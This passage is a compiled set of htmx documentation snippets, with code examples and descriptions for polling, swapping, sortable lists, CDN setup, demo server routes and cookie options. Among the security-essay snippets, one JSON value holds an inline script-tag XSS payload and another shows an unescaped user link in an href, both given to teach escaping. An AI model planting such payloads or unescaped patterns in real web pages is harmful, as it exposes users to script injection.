sortable.addEventListener(\"htmx:afterSwap\", function() {\n            sortableInstance.option(\"disabled\", false);\n          });\n        }\n    })\n    \n    var listItems = [1, 2, 3, 4, 5]\n    // routes\n    init(\"/demo\", function(request, params){\n      return '<form id=\"example1\" class=\"list-group col sortable\" hx-post=\"/items\" hx-trigger=\"end\">' +\n      listContents()\n      + \"\\n</form>\";\n    });\n    \n    onPost(\"/items\", function (request, params) {\n      console.log(params);\n      listItems = params.item;\n      return listContents();\n    });\n    \n    // templates\n    function listContents() {\n      return '<div class=\"htmx-indicator\" style=\"cursor: default\">Updating...</div>' + listItems.map(function(val) {\n        return `  <div style=\"border:1px solid #DEDEDE; padding:12px; margin: 8px; width:200px; cursor: grab\" ondrag=\"this.style.cursor = 'grabbing'\" ><input type=\"hidden\" name=\"item\" value=\"` + val + `\"/> Item ` + val + `</div>`;\n      }).join(\"\\n\");\n    }\n```\n\n----------------------------------------\n\nTITLE: JSON Default htmx Response Handling Configuration\nDESCRIPTION: Illustrates the default response handling configuration in htmx, which determines how different HTTP status codes are handled in terms of swapping and error reporting. The configuration handles 204, 2xx, 4xx and 5xx status codes.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/QUIRKS.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"responseHandling\": [\n    {\"code\":\"204\", \"swap\": false},\n    {\"code\":\"[23]..\", \"swap\": true},\n    {\"code\":\"[45]..\", \"swap\": false, \"error\":true},\n    {\"code\":\"...\", \"swap\": false}]\n}\n```\n\n----------------------------------------\n\nTITLE: Custom CSS for htmx Indicator\nDESCRIPTION: This CSS snippet provides an alternative method to show/hide the htmx indicator using `display` property instead of `opacity`. By default, the `.htmx-indicator` is hidden, and the `.htmx-request .htmx-indicator` and `.htmx-request.htmx-indicator` are set to inline, making it visible during the request.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_17\n\nLANGUAGE: css\nCODE:\n```\n.htmx-indicator{\n    display:none;\n}\n.htmx-request .htmx-indicator{\n    display:inline;\n}\n.htmx-request.htmx-indicator{\n    display:inline;\n}\n```\n\n----------------------------------------\n\nTITLE: HTML iframe for generalized transclusion using htmz\nDESCRIPTION: This HTML snippet demonstrates the entire source code of the htmz library, which utilizes an iframe and the location hash to achieve generalized transclusion. The iframe's onload event triggers a function that replaces the element targeted by the location hash with the content from the iframe's document body.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/alternatives.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n  <iframe hidden name=htmz onload=\"setTimeout(()=>document.querySelector(contentWindow.location.hash||null)?.replaceWith(...contentDocument.body.childNodes))\"></iframe>\n```\n\n----------------------------------------\n\nTITLE: htmx: issueAjaxRequest() Function Analysis (JavaScript)\nDESCRIPTION: This JavaScript function, located in the htmx library, handles AJAX requests. It is a large \"crux\" function with nearly 400 lines of code, responsible for a series of linear steps without much reuse potential.  It prioritizes clarity and debuggability over strict adherence to 'Clean Code' principles.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/codin-dirty.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nRefer to: https://github.com/bigskysoftware/htmx/blob/7fc1d61b4fdbca486263eda79c3f31feb10af783/src/htmx.js#L4057\n```\n\n----------------------------------------\n\nTITLE: Installing response-targets via CDN\nDESCRIPTION: This snippet demonstrates how to install the response-targets extension by including it from a CDN.  It shows how to include both the core htmx library and the extension, and how to enable the extension on the body element using the `hx-ext` attribute. This method requires an internet connection.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/response-targets.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<head>\n    <script src=\"https://unpkg.com/htmx.org@2.0.4\" integrity=\"sha384-HGfztofotfshcF7+8n44JQL2oJmowVChPTg48S+jvZoztPfvwD79OC/LTtG6dMp+\" crossorigin=\"anonymous\"></script>\n    <script src=\"https://unpkg.com/htmx-ext-response-targets@2.0.2\" integrity=\"sha384-T41oglUPvXLGBVyRdZsVRxNWnOOqCynaPubjUVjxhsjFTKrFJGEMm3/0KGmNQ+Pg\" crossorigin=\"anonymous\"></script>\n</head>\n<body hx-ext=\"response-targets\">\n...\n\n```\n\n----------------------------------------\n\nTITLE: Table Body with HTMX Target and Swap\nDESCRIPTION: This HTML snippet defines the table body with HTMX attributes to target the closest enclosing row and swap the outer HTML when a request is triggered from within the table. It is essential for updating the row with either editable or non-editable content.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/edit-row.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<table class=\"table delete-row-example\">\n  <thead>\n    <tr>\n      <th>Name</th>\n      <th>Email</th>\n      <th></th>\n    </tr>\n  </thead>\n  <tbody hx-target=\"closest tr\" hx-swap=\"outerHTML\">\n    ...\n  </tbody>\n</table>\n```\n\n----------------------------------------\n\nTITLE: htmx Button Implementation\nDESCRIPTION: This HTML snippet defines a button that triggers an htmx POST request to the /example endpoint, targeting the next output element. It serves as the initial element that requires authentication before making the request.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/async-auth.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n  <button hx-post=\"/example\" hx-target=\"next output\">\n    An htmx-Powered button\n  </button>\n  <output>\n    --\n  </output>\n```\n\n----------------------------------------\n\nTITLE: Displaying User Favorite Link\nDESCRIPTION: This code snippet demonstrates how to display a user's favorite website link.  It highlights the security risks associated with allowing users to submit arbitrary URLs, as the default escaping mechanisms can break the URL.  The example suggests using a custom escaping function that escapes everything but forward slashes.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/web-security-basics-with-htmx.md#_snippet_16\n\nLANGUAGE: HTML\nCODE:\n```\n<a href=\"{{ user.fav_link }}\">\n```\n\n----------------------------------------\n\nTITLE: HTML hx-push-url attribute example\nDESCRIPTION: Demonstrates how to use the `hx-push-url` attribute to push the request URL into the browser navigation bar and add the current page state to browser history.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_36\n\nLANGUAGE: html\nCODE:\n```\n<a hx-get=\"/blog\" hx-push-url=\"true\">Blog</a>\n```\n\n----------------------------------------\n\nTITLE: Registering Service Worker in HTML\nDESCRIPTION: This script registers a service worker in an HTML page. It checks if the `serviceWorker` API is available in the navigator. If it is, it adds an event listener that waits for the window to load and then registers the service worker located at `/sw.js`.  Success and failure messages are logged to the console.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/you-cant.md#_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<script>\n  if ('serviceWorker' in navigator) {\n    window.addEventListener('load', function() {\n      navigator.serviceWorker.register('/sw.js').then(function(registration) {\n        console.log('ServiceWorker registration successful with scope: ', registration.scope);\n      }, function(err) {\n        console.log('ServiceWorker registration failed: ', err);\n      });\n    });\n  }\n</script>\n```\n\n----------------------------------------\n\nTITLE: Find Closest Element - htmx.closest() - JavaScript\nDESCRIPTION: This code snippet demonstrates how to find the closest enclosing element matching a selector using the `htmx.closest()` method. It searches the parentage of the element, inclusive of the element itself.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/api.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n// find the closest enclosing div of the element with the id 'demo'\nhtmx.closest(htmx.find('#demo'), 'div');\n```\n\n----------------------------------------\n\nTITLE: Editable Carnival Ride Table with Web Components (HTML)\nDESCRIPTION: This HTML snippet demonstrates an editable carnival ride table using custom Web Components named `<edit-cell>`. It integrates with htmx using `hx-put` on the form element to submit data to the /carnival endpoint. This approach encapsulates the cell editing logic within the `<edit-cell>` component, promoting code reusability and a cleaner HTML structure.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/webcomponents-work-great.md#_snippet_2\n\nLANGUAGE: HTML\nCODE:\n```\n<form hx-put=/carnival>\n<table>\n  <tr>\n    <th>Name\n    <th>Carousel\n    <th>Roller Coaster\n  </tr>\n  <tr>\n    <td>Alex\n    <td><edit-cell name=\"alex-carousel\" value=\"Yes\"></edit-cell>\n    <td><edit-cell name=\"alex-roller\" value=\"No\"></edit-cell>\n  </tr>\n  <tr>\n    <td>Sophia\n    <td><edit-cell name=\"sophia-carousel\" value=\"Yes\"></edit-cell>\n    <td><edit-cell name=\"sophia-roller\" value=\"Yes\"></edit-cell>\n  </tr>\n</table>\n<button>Save</button>\n</form>\n```\n\n----------------------------------------\n\nTITLE: Polling with htmx\nDESCRIPTION: This HTML snippet configures an element to poll a URL every 2 seconds using the hx-get and hx-trigger attributes. The hx-get attribute specifies the URL to poll, and the hx-trigger attribute with the 'every 2s' value sets the polling interval. The response from the server will be loaded into the div.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_14\n\nLANGUAGE: html\nCODE:\n```\n<div hx-get=\"/news\" hx-trigger=\"every 2s\"></div>\n```\n\n----------------------------------------\n\nTITLE: Including htmx via CDN\nDESCRIPTION: This snippet demonstrates how to include the htmx library in an HTML document using a Content Delivery Network (CDN). It references version 2.0.0-beta4. This provides a quick and easy way to integrate htmx into a project without managing local files.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/posts/2024-04-22-htmx-2.0.0-beta4-is-released.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<script src=\"https://unpkg.com/htmx.org@2.0.0-beta4/dist/htmx.min.js\"></script>\n```\n\n----------------------------------------\n\nTITLE: Embedding Inline Scripts in HTML\nDESCRIPTION: This HTML snippet shows the standard HTML `onclick` attribute for embedding inline JavaScript. When the button is clicked, an alert box will appear with the message \"You clicked me!\". This demonstrates the fundamental mechanism of embedding scripts directly within HTML elements.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_47\n\nLANGUAGE: html\nCODE:\n```\n<button onclick=\"alert('You clicked me!')\">\n    Click Me!\n</button>\n```\n\n----------------------------------------\n\nTITLE: Parsing an Interval String in htmx (JavaScript)\nDESCRIPTION: This snippet demonstrates how to parse an interval string using the `htmx.parseInterval()` method. It supports time intervals in seconds (\"s\") and milliseconds (\"ms\").  It is useful for handling timing related attributes in plugins. All other values are parsed using parseFloat, which may lead to unexpected behavior.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/api.md#_snippet_15\n\nLANGUAGE: javascript\nCODE:\n```\n// returns 3000\nvar milliseconds = htmx.parseInterval(\"3s\");\n\n// returns 3 - Caution\nvar milliseconds = htmx.parseInterval(\"3m\");\n```\n\n----------------------------------------\n\nTITLE: Simulated Server-Side Data Generation\nDESCRIPTION: This JavaScript code simulates a server-side data store with a function to generate contact data and retrieve contacts for a specific page. It is used to mock the backend data retrieval for the HTMX click-to-load example.  It returns mock contact information.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/click-to-load.md#_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n    var dataStore = function(){\n      var contactId = 9;\n      function generateContact() {\n        contactId++;\n        var idHash = \"\";\n        var possible = \"ABCDEFG0123456789\";\n        for( var i=0; i < 15; i++ ) idHash += possible.charAt(Math.floor(Math.random() * possible.length));\n        return { name: \"Agent Smith\", email: \"void\" + contactId + \"@null.org\", id: idHash }\n      }\n      return {\n        contactsForPage : function(page) {\n          var vals = [];\n          for( var i=0; i < 10; i++ ){\n            vals.push(generateContact());\n          }\n          return vals;\n        }\n      }\n    }()\n```\n\n----------------------------------------\n\nTITLE: Initializing SortableJS with htmx.onLoad\nDESCRIPTION: This JavaScript snippet shows how to initialize SortableJS using htmx's `htmx.onLoad` function, ensuring initialization after new content is loaded via htmx. The `content` parameter in `htmx.onLoad` represents the newly loaded portion of the DOM. This is important to only apply the sortable functionality to the new content that has been loaded via htmx.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_52\n\nLANGUAGE: javascript\nCODE:\n```\nhtmx.onLoad(function(content) {\n    var sortables = content.querySelectorAll(\".sortable\");\n    for (var i = 0; i < sortables.length; i++) {\n        var sortable = sortables[i];\n        new Sortable(sortable, {\n            animation: 150,\n            ghostClass: 'blue-background-class'\n        });\n    }\n})\n```\n\n----------------------------------------\n\nTITLE: HTML Table with hx-get Polling\nDESCRIPTION: This HTML snippet demonstrates using htmx to poll the server every 30 seconds for updates to the contacts table.  The `hx-get` attribute specifies the endpoint to retrieve the table content, and `hx-swap=\"outerHTML\"` replaces the entire table with the response.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/hypermedia-apis-vs-data-apis.md#_snippet_4\n\nLANGUAGE: html\nCODE:\n```\n<div>\n    <form action='/contacts' method=\"post\">\n      <!-- form for adding contacts -->\n    </form>\n    <table hx-trigger=\"every 30s\" hx-get=\"/contacts/table\" hx-swap=\"outerHTML\">\n      <!-- contacts table -->\n    </table>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Deleting Content with hx-delete\nDESCRIPTION: This snippet represents the htmx equivalent to Intercooler's `ic-delete-from` attribute.  It uses the `hx-delete` attribute to send a DELETE request to a specified URL, deleting the content at that endpoint. Requires the htmx library.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/migration-guide-intercooler.md#_snippet_2\n\nLANGUAGE: html\nCODE:\n```\nhx-delete\n```\n\n----------------------------------------\n\nTITLE: SSE Unnamed Message Example - Text\nDESCRIPTION: This is an example of an SSE message without an event name. In this case, the browser uses the default name `message` in its place.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/sse.md#_snippet_10\n\nLANGUAGE: txt\nCODE:\n```\ndata: <div>Content to swap into your HTML page.</div>\n```\n\n----------------------------------------\n\nTITLE: Original Form Structure (HTML)\nDESCRIPTION: Shows the original form structure where the file input is inside the form.  This structure leads to the file input losing its value upon server-side error returns due to the hx-swap attribute replacing the entire form element. The `enctype` attribute is set to `multipart/form-data` to allow file uploads.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/file-upload-input.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<form method=\"POST\" id=\"binaryForm\" enctype=\"multipart/form-data\" hx-swap=\"outerHTML\" hx-target=\"#binaryForm\">\n    <input type=\"file\" name=\"binaryFile\">\n    <button type=\"submit\">Submit</button>\n</form>\n```\n\n----------------------------------------\n\nTITLE: Defining Fake Server Routes for HTMX Demo in JS\nDESCRIPTION: Defines fake server-side routes using functions like `init` and `onGet` to simulate server behavior for the HTMX demo. These routes handle requests triggered by the HTMX attributes in the web component.  The `init` function sets up the initial state, and `onGet` handles the `/my-component-clicked` route, returning updated content.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/web-components.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n//=========================================================================\n// Fake Server Side Code\n//=========================================================================\n\n// data\nlet timesClicked = 0\n\ncustomElements.define('my-component', class MyComponent extends HTMLElement {\n  // This method runs when your custom element is added to the page\n  connectedCallback() {\n    const root = this.attachShadow({ mode: 'closed' })\n    root.innerHTML = `\n        <button hx-get=\"/my-component-clicked\" hx-target=\"next div\">Click me!</button>\n        <div></div>\n    `\n    htmx.process(root) // Tell HTMX about this component's shadow DOM\n  }\n})\n\n// routes\ninit('/demo', function() {\n  return `<my-component></my-component>`\n})\n\nonGet('/my-component-clicked', function() {\n  return `<p>Clicked ${++timesClicked} time${timesClicked > 1 ? 's' : ''}!</p>`\n})\n```\n\n----------------------------------------\n\nTITLE: Centering Banner Image\nDESCRIPTION: This HTML snippet centers a banner image on the page. It uses a div with inline styling to align the image horizontally and adds some margin.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/_index.md#_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<div style=\"text-align: center;margin:32px\">\n  <img width=\"90%\" loading=\"lazy\" src=\"/img/createdwith.jpeg\">\n</div>\n```\n\n----------------------------------------\n\nTITLE: Polling with Conditional Filter - HTML\nDESCRIPTION: This example demonstrates polling with a conditional filter. The element will issue a `GET` request to `/latest_updates` every second, but only if `someConditional` evaluates to true. The filter is added *after* the poll declaration.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-trigger.md#_snippet_7\n\nLANGUAGE: html\nCODE:\n```\n<div hx-get=\"/latest_updates\" hx-trigger=\"every 1s [someConditional]\">\n  Nothing Yet!\n</div>\n```\n\n----------------------------------------\n\nTITLE: CSS Transition - Fade Out On Swap with htmx\nDESCRIPTION: This snippet demonstrates how to fade out an element before it's removed from the DOM using CSS transitions and htmx. The `htmx-swapping` class is used to trigger the fade-out animation during the swap phase. The `hx-swap` attribute extends the swap phase to allow the animation to complete.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/animations.md#_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<style>\n.fade-me-out.htmx-swapping {\n  opacity: 0;\n  transition: opacity 1s ease-out;\n}\n</style>\n<button class=\"fade-me-out\"\n        hx-delete=\"/fade_out_demo\"\n        hx-swap=\"outerHTML swap:1s\">\n        Fade Me Out\n</button>\n```\n\n----------------------------------------\n\nTITLE: UIKit Modal Animation with JavaScript\nDESCRIPTION: This JavaScript code snippet demonstrates how to trigger UIKit's modal animations using standard JavaScript.  It adds and removes the `uk-open` class from the modal element to control its visibility, and it empties the target div to fully remove the modal from the DOM after closing.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/modal-uikit.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\n// This triggers the fade-in animation when a modal dialog is loaded and displayed\nwindow.document.getElementById(\"showButton\").addEventListener(\"htmx:afterOnLoad\", function() {\n\tsetTimeout(function(){\n\t\twindow.document.getElementById(\"modal\").classList.add(\"uk-open\")\n\t}, 10)\n})\n\n\n// This triggers the fade-out animation when the modal is closed.\nwindow.document.getElementById(\"cancelButton\").addEventListener(\"click\", function() {\n\twindow.document.getElementById(\"modal\").classList.remove(\"uk-open\")\n\tsetTimeout(function(){\n\t\twindow.document.getElementById(\"modals-here\").innerHTML = \"\"\n\t\t,200\n\t})\n})\n```\n\n----------------------------------------\n\nTITLE: HTML hx-confirm Attribute Inheritance\nDESCRIPTION: Demonstrates how the `hx-confirm` attribute can be inherited from a parent element to child elements, reducing code duplication. Shows how to apply an `unset` directive to child elements to disable the inherited confirmation.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_32\n\nLANGUAGE: html\nCODE:\n```\n<div hx-confirm=\"Are you sure?\">\n    <button hx-delete=\"/account\">\n        Delete My Account\n    </button>\n    <button hx-put=\"/account\">\n        Update My Account\n    </button>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Running htmx Automated Tests with npm\nDESCRIPTION: This code snippet demonstrates how to run the automated tests for the htmx project using npm. This command helps ensure that the development environment is set up correctly and that any changes made do not introduce regressions.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/CONTRIBUTING.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm test\n```\n\n----------------------------------------\n\nTITLE: CSS Styling - View Transitions Slide Animation\nDESCRIPTION: Defines the CSS styles and keyframes for the View Transitions API slide animation. It includes keyframes for fade-in, fade-out, slide-from-right, and slide-to-left animations, and applies these animations to the `::view-transition-old` and `::view-transition-new` pseudo-elements.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/animations.md#_snippet_15\n\nLANGUAGE: css\nCODE:\n```\n@keyframes fade-in {\n     from { opacity: 0; }\n   }\n\n   @keyframes fade-out {\n     to { opacity: 0; }\n   }\n\n   @keyframes slide-from-right {\n     from { transform: translateX(90px); }\n   }\n\n   @keyframes slide-to-left {\n     to { transform: translateX(-90px); }\n   }\n\n   .slide-it {\n     view-transition-name: slide-it;\n   }\n\n   ::view-transition-old(slide-it) {\n     animation: 180ms cubic-bezier(0.4, 0, 1, 1) both fade-out,\n     600ms cubic-bezier(0.4, 0, 0.2, 1) both slide-to-left;\n   }\n   ::view-transition-new(slide-it) {\n     animation: 420ms cubic-bezier(0, 0, 0.2, 1) 90ms both fade-in,\n     600ms cubic-bezier(0.4, 0, 0.2, 1) both slide-from-right;\n   }\n```\n\n----------------------------------------\n\nTITLE: Integrating Sortable.js with htmx using Events\nDESCRIPTION: This code snippet demonstrates how to integrate the Sortable.js library with htmx to create a drag-and-drop interface that triggers a hypermedia exchange when the user finishes sorting items. The hx-trigger attribute listens for the 'end' event emitted by Sortable.js, initiating a POST request to the server to update the item order. This turns the Sortable.js drag-and-drop powered widget into a hypermedia control.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/hypermedia-friendly-scripting.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<form class=\"sortable\" hx-post=\"/items\" hx-trigger=\"end\">\n  <div class=\"htmx-indicator\">Updating...</div>\n  <div><input type='hidden' name='item' value='1'/>Item 1</div>\n  <div><input type='hidden' name='item' value='2'/>Item 2</div>\n  <div><input type='hidden' name='item' value='3'/>Item 3</div>\n  <div><input type='hidden' name='item' value='4'/>Item 4</div>\n  <div><input type='hidden' name='item' value='5'/>Item 5</div>\n</form>\n```\n\n----------------------------------------\n\nTITLE: htmx Anchor Tag with data- Prefix\nDESCRIPTION: This example demonstrates using the `data-` prefix with htmx attributes. It's an alternative way to define htmx behavior, posting to /click when the anchor is clicked.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_2\n\nLANGUAGE: HTML\nCODE:\n```\n<a data-hx-post=\"/click\">Click Me!</a>\n```\n\n----------------------------------------\n\nTITLE: Example JSON Response (JSON)\nDESCRIPTION: This code snippet demonstrates a JSON response containing a property with HTML formatted content. It emphasizes the need to sanitize or escape HTML content from JSON responses before inserting it into the DOM to prevent XSS vulnerabilities. Using `textContent` is recommended for safe insertion.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/web-security-basics-with-htmx.md#_snippet_12\n\nLANGUAGE: JSON\nCODE:\n```\n{ \"name\": \"<script>alert('Hahaha I am a script')</script>\" }\n```\n\n----------------------------------------\n\nTITLE: Synchronizing Form Submission and Validation Requests - HTML\nDESCRIPTION: This snippet illustrates a potential race condition between a form submission and an input's validation request when using htmx. Without `hx-sync`, both requests may occur in parallel.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/docs.md#_snippet_21\n\nLANGUAGE: html\nCODE:\n```\n<form hx-post=\"/store\">\n    <input id=\"title\" name=\"title\" type=\"text\"\n        hx-post=\"/validate\"\n        hx-trigger=\"change\">\n    <button type=\"submit\">Submit</button>\n</form>\n```\n\n----------------------------------------\n\nTITLE: JavaScript: Simulating Server-Side Validation\nDESCRIPTION: This JavaScript code simulates server-side validation logic. It defines routes and templates for handling form submissions and email validation requests using HTMX.  The code checks if the email is valid and if it is the accepted value.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/examples/inline-validation.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\n    //=========================================================================\n    // Fake Server Side Code\n    //=========================================================================\n\n    // routes\n    init(\"/demo\", function(request, params){\n      return demoTemplate();\n    });\n\n    onPost(\"/contact\", function(request, params){\n      return formTemplate();\n    });\n\n    onPost(/\\/contact\\/email.*/, function(request, params){\n        var email = params['email'];\n        if(!/\\S+@\\S+\\.\\S+/.test(email)) {\n          return emailInputTemplate(email, \"Please enter a valid email address\");\n        } else if(email != \"test@test.com\") {\n          return emailInputTemplate(email, \"That email is already taken.  Please enter another email.\");\n        } else {\n          return emailInputTemplate(email);\n        }\n     });\n\n    // templates\n    function demoTemplate() {\n\n        return `<h3>Signup Form</h3><p>Enter an email into the input below and on tab out it will be validated.  Only \"test@test.com\" will pass.</p> ` + formTemplate();\n    }\n\n    function formTemplate() {\n      return `<form hx-post=\"/contact\">\n  <div hx-target=\"this\" hx-swap=\"outerHTML\">\n    <label for=\"email\">Email Address</label>\n    <input name=\"email\" id=\"email\" hx-post=\"/contact/email\" hx-indicator=\"#ind\">\n    <img id=\"ind\" src=\"/img/bars.svg\" class=\"htmx-indicator\"/>\n  </div>\n  <div class=\"form-group\">\n    <label for=\"firstName\">First Name</label>\n    <input type=\"text\" class=\"form-control\" name=\"firstName\" id=\"firstName\">\n  </div>\n  <div class=\"form-group\">\n    <label for=\"lastName\">Last Name</label>\n    <input type=\"text\" class=\"form-control\" name=\"lastName\" id=\"lastName\">\n  </div>\n  <button type='submit' class=\"btn primary\" disabled>Submit</button>\n</form>`;\n    }\n\n        function emailInputTemplate(val, errorMsg) {\n            return `<div hx-target=\"this\" hx-swap=\"outerHTML\" class=\"${errorMsg ? \"error\" : \"valid\"}\">\n  <label>Email Address</label>\n  <input name=\"email\" hx-post=\"/contact/email\" hx-indicator=\"#ind\" value=\"${val}\" aria-invalid=\"${!!errorMsg}\">\n  <img id=\"ind\" src=\"/img/bars.svg\" class=\"htmx-indicator\"/>\n  ${errorMsg ? (`<div class='error-message' >${errorMsg}</div>`) : \"\"}\n</div>`;\n        }\n\n```\n\n----------------------------------------\n\nTITLE: HTML Disabling htmx History Caching\nDESCRIPTION: Shows how to disable htmx's history caching feature using the `htmx.config.historyCacheSize` configuration variable, which is set via a `<meta>` tag. Disabling history caching can resolve issues with 3rd party javascript, but will slow history navigation.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/QUIRKS.md#_snippet_8\n\nLANGUAGE: HTML\nCODE:\n```\n  <meta name=\"htmx-config\" content='{\"historyCacheSize\": 0}'>\n```\n\n----------------------------------------\n\nTITLE: Preloading Linked Images\nDESCRIPTION: This code demonstrates how to preload linked images using the `preload-images` attribute. The `preload` attribute triggers the preloading based on an event (e.g., `mouseover`).\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/extensions/preload.md#_snippet_5\n\nLANGUAGE: HTML\nCODE:\n```\n<div hx-ext=\"preload\">\n    <a href=\"/my-next-page\" preload=\"mouseover\" preload-images=\"true\">Next Page</a>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Install npm dependencies for local htmx development\nDESCRIPTION: This snippet shows the command to install the development dependencies for contributing to the htmx project. This is necessary for running tests and developing features locally.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/README.md#_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nnpm install\n```\n\n----------------------------------------\n\nTITLE: Run a web server for local htmx development\nDESCRIPTION: This snippet shows the command to run a simple web server using `npx serve` in the root directory. This is used during development to serve the files for testing and development.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/README.md#_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nnpx serve\n```\n\n----------------------------------------\n\nTITLE: Using Server-Sent Events with hx-sse\nDESCRIPTION: This snippet shows how to connect to a Server-Sent Events stream using htmx's `hx-sse`. Listens for server-sent events and updates the element. Requires the htmx library.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/migration-guide-intercooler.md#_snippet_17\n\nLANGUAGE: html\nCODE:\n```\nhx-sse\n```\n\n----------------------------------------\n\nTITLE: Secure HTTP Response with Cookie Options (HTTP)\nDESCRIPTION: This code snippet demonstrates setting secure cookie options in an HTTP response. The `Secure`, `HttpOnly`, and `SameSite=Lax` attributes enhance cookie security, preventing transmission over HTTP, JavaScript access, and Cross-Site Request Forgery (CSRF) attacks, respectively.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/essays/web-security-basics-with-htmx.md#_snippet_11\n\nLANGUAGE: HTTP\nCODE:\n```\nHTTP/2.0 200 OK\nContent-Type: text/html\nSet-Cookie: token=asd8234nsdfp982; Secure; HttpOnly; SameSite=Lax\n\n[HTML content]\n```\n\n----------------------------------------\n\nTITLE: hx-swap-oob with paragraph HTML\nDESCRIPTION: This example shows how to use `hx-swap-oob` to insert a paragraph (`<p>`). The `<p>` is encapsulated within a `<span>` tag that specifies the target element with `beforeend:#text`. The encapsulating `<span>` tag will be stripped during the swap.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/attributes/hx-swap-oob.md#_snippet_4\n\nLANGUAGE: html\nCODE:\n```\n<span hx-swap-oob=\"beforeend:#text\">\n\t<p>...</p>\n</span>\n```\n\n----------------------------------------\n\nTITLE: Displaying Silver Sponsors - HTML\nDESCRIPTION: This HTML snippet defines the structure for displaying the silver sponsors in a grid layout. It includes links to the sponsors' websites and displays their logos with support for dark and light mode themes. Data attributes like `data-github-account` are included for some sponsors.\nSOURCE: https://github.com/bigskysoftware/htmx/blob/master/www/content/_index.md#_snippet_4\n\nLANGUAGE: html\nCODE:\n```\n<div id=\"silver-sponsors\" style=\"display: grid;grid-template-columns: repeat(3, 1fr); align-items: center; justify-items: center; \">\n<div>\n        <a data-github-account=\"JetBrainsOfficial\" href=\"https://www.jetbrains.com\"><img  src=\"/img/jetbrains.svg\" alt=\"Jetbrains\"></a>\n</div>\n<div>\n        <a href=\"https://github.blog/2023-04-12-github-accelerator-our-first-cohort-and-whats-next\"><img class=\"dark-invert\" src=\"/img/Github_Logo.png\" alt=\"GitHub\" style=\"max-width:80%;min-width:100px;\"></a>\n</div>\n<div>\n        <a data-github-account=\"craftcms\" href=\"https://craftcms.com\">\n        <img class=\"dark-hidden\" src=\"/img/logo-craft-cms.svg\" alt=\"craft cms\">\n        <img  class=\"dark-visible\" src=\"/img/logo-craft-cms-dark.svg\" alt=\"craft cms\">\n        </a>\n</div>\n<div>\n        <a data-github-account=\"ButterCMS\" href=\"https://buttercms.com/?utm_campaign=sponsorship&utm_medium=banner&utm_source=htmxhome\">\n          <img class=\"dark-invert\" style=\"min-width: 150px;\" src=\"/img/butter-cms.svg\" alt=\"ButterCMS\">\n        </a>\n</div>\n<div>\n        <a data-github-account=\"Black-HOST\" 